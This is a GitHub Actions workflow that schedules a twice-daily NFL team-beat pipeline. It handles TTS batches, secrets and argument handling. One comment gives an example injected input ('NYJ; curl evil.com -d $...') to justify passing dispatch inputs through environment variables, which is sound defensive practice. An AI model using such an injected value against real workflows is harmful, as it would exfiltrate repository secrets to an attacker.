name: team-beat

# Twice-daily NFL team beat cycle.
#
# Schedule: 04:00 + 16:00 UTC = 06:00 + 18:00 Berlin (winter time).
# DST drift (Mar–Oct) shifts the Berlin slots to 05:00 + 17:00; accepted
# at MVP scale per docs/team_beat_mvp.md §11.
#
# Pipeline (each firing): preflight → editorial-cycle beat → upload summary.
# The preflight cancels any stale gemini_tts_batch rows from a prior
# cycle so the sibling repo's cleanup workflow doesn't re-fire them and
# create duplicate Gemini batches (= duplicate spend).

on:
  schedule:
    - cron: "0 4,16 * * *"
  workflow_dispatch:
    inputs:
      teams:
        description: "Comma-separated team codes (empty = all configured personas)"
        required: false
        default: ""
      lookback_hours:
        description: "Feed lookback window in hours"
        required: false
        default: "12"

# Single-flight: never let two team-beat cycles run concurrently. cancel-in-progress=false
# means a manual workflow_dispatch trigger waits for an in-flight scheduled run rather
# than killing it (a half-finished cycle would leave team_roundup rows with NULL audio
# while their batch_ids are stranded).
concurrency:
  group: team-beat
  cancel-in-progress: false

jobs:
  run:
    runs-on: ubuntu-latest
    # Sized to outlast the inner TTS deadlines so the runner never kills the
    # job mid-pipeline (which would skip _persist_team and strand the
    # tts_batch_id, defeating the recovery story this workflow is built around):
    #   tts_create_timeout_seconds:        1800s = 30m
    #   tts_status_poll_timeout_seconds:   1800s = 30m  (Gemini state loop)
    #   tts_process_timeout_seconds:        900s = 15m
    #   ─────────────────────────────────  75m  TTS worst case
    # + checkout / setup-python / pip install / preflight / agent calls
    # ≈ 120m with comfortable headroom. If the cycle approaches this, the
    # underlying inner timeouts have already failed soft and persisted state.
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: pip
          cache-dependency-path: pyproject.toml

      - name: Install
        run: pip install -e .

      - name: Preflight — cancel stale gemini_tts_batch rows
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          # Required by Settings even though preflight doesn't use it.
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: python scripts/team_beat_preflight.py

      - name: Run team-beat cycle
        env:
          # Core
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}

          # TTS batch service (sibling Cloud Run deployment — see
          # docs/team_beat_mvp.md §7).
          TTS_BATCH_SUBMIT_URL: ${{ secrets.TTS_BATCH_SUBMIT_URL }}
          TTS_BATCH_POLL_URL: ${{ secrets.TTS_BATCH_POLL_URL }}
          TTS_BATCH_FUNCTION_AUTH_TOKEN: ${{ secrets.TTS_BATCH_FUNCTION_AUTH_TOKEN }}

          # workflow_dispatch inputs — passed through env so the shell never
          # interpolates user-controlled strings into the script body. Without
          # this, a dispatcher could submit `teams=NYJ; curl evil.com -d $...`
          # and exfiltrate the secrets above. Inside `run:` we read these as
          # ordinary $VARS and quote them when building the argv array.
          TEAMS_INPUT: ${{ github.event.inputs.teams }}
          LOOKBACK_INPUT: ${{ github.event.inputs.lookback_hours }}

          # Repo-variable overrides (TTS_MODEL_NAME / TTS_VOICE_NAME and the
          # OPENAI_MODEL_* set) are intentionally NOT in this env block.
          # When a vars expression is unset, `${{ vars.X }}` expands to "",
          # which pydantic-settings treats as an explicit override and would
          # send model_name="" to Gemini (400). Each is exported below only
          # when its value is non-empty.
        run: |
          set -euo pipefail
          # Per-agent + TTS overrides via repo variables — only export when
          # set and non-empty (an empty model/voice name is a 400 from the
          # upstream API).
          if [ -n "${{ vars.TTS_MODEL_NAME }}" ]; then
            export TTS_MODEL_NAME="${{ vars.TTS_MODEL_NAME }}"
          fi
          if [ -n "${{ vars.TTS_VOICE_NAME }}" ]; then
            export TTS_VOICE_NAME="${{ vars.TTS_VOICE_NAME }}"
          fi
          if [ -n "${{ vars.OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT }}" ]; then
            export OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT="${{ vars.OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT }}"
          fi
          if [ -n "${{ vars.OPENAI_MODEL_RADIO_SCRIPT_AGENT }}" ]; then
            export OPENAI_MODEL_RADIO_SCRIPT_AGENT="${{ vars.OPENAI_MODEL_RADIO_SCRIPT_AGENT }}"
          fi
          if [ -n "${{ vars.OPENAI_MODEL_ARTICLE_QUALITY_GATE_AGENT }}" ]; then
            export OPENAI_MODEL_ARTICLE_QUALITY_GATE_AGENT="${{ vars.OPENAI_MODEL_ARTICLE_QUALITY_GATE_AGENT }}"
          fi

          # Build argv from env-passed inputs. Quoting "${args[@]}" preserves
          # word boundaries even if someone managed to smuggle whitespace into
          # an input — they'd just see argparse reject the value, not get
          # arbitrary shell execution with the secrets above.
          args=()
          if [ -n "${TEAMS_INPUT:-}" ]; then
            args+=(--teams "$TEAMS_INPUT")
          fi
          args+=(--lookback-hours "${LOOKBACK_INPUT:-12}")

          mkdir -p var
          # Tee stdout+stderr so the artifact captures both the cycle summary
          # line and any per-team agent error traces.
          editorial-cycle beat "${args[@]}" 2>&1 | tee var/team-beat.log

      - name: Upload cycle log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: team-beat-${{ github.run_id }}
          path: var/team-beat.log
          if-no-files-found: ignore
          retention-days: 14
